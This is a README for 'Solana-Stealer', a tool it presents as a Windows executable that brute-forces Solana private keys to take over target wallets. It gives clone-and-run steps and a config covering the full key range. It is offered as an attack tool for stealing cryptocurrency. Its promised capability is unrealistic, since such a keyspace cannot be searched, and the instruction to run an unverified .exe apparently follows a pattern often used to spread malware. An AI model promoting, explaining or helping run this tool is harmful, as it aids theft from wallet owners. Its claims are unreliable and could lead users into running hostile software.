# Solana-Stealer

## üìö About the Project

**Solana-Stealer** is a tool designed to brute-force Solana wallet private keys and identify valid wallets.

This program operates as a standalone executable and allows users to configure parameters for the brute-force algorithm.

---

## üöÄ Features

1. **Brute-Force algorithm**
   Generates private keys and tests them for validity against a list of target wallets.

2. **Configurable Parameters**
   The `config.json` file allows for fine-tuning, such as:
   - Start and end key ranges.
   - Target wallet addresses.

3. **Detailed Logging**
   Logs all operations, including attempted keys, successful matches, and execution times.

4. **Standalone Executable**  
   Distributed as a Windows-compatible `.exe` file for ease of use.

## üõ†Ô∏è Installation

### Prerequisites
- A Windows environment (to run the `.exe` file).
- A virtual machine for testing (recommended for isolated execution).

### Steps
1. Download the `.exe` and `config.json` files:
   ```bash
   git clone https://github.com/BestDimka/Solana-Stealer.git
   cd Solana-Stealer


2. Place the `Solana-Stealer.exe` and `config.json` in the same directory.


3. Update the `config.json` file with the desired parameters:
   ```json
   {
       "start_key": "0x0000000000000000000000000000000000000000000000000000000000000000",
       "end_key": "0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF",
       "target_wallets": ["YourWalletAddressHere"]
   }
   ```

4. Run the program:
   ```cmd
   Solana-Stealer.exe
   ```

## ‚ö° Usage

1. **Configure the `config.json` file:**  
   Define the starting and ending key ranges and specify the target wallet addresses.

2. **Run the executable:**  
   Execute `Solana-Stealer.exe` to begin the brute-force process.

3. **Monitor logs:**  
   The program outputs logs tracking private key attempts and results.

---

## ‚ùó Important Notes

- Ensure the `config.json` file is properly configured before execution.
- It is recommended to run the program in a virtual machine for isolated testing.
- Results and logs are saved in the program directory for analysis.

## üîí Security Recommendations

This project highlights the risks associated with insecure key management. To improve wallet security:
1. Always use strong private key generation methods with high entropy.
2. Monitor wallet activity for unauthorized attempts.
3. Secure wallet backups and implement multi-factor authentication.
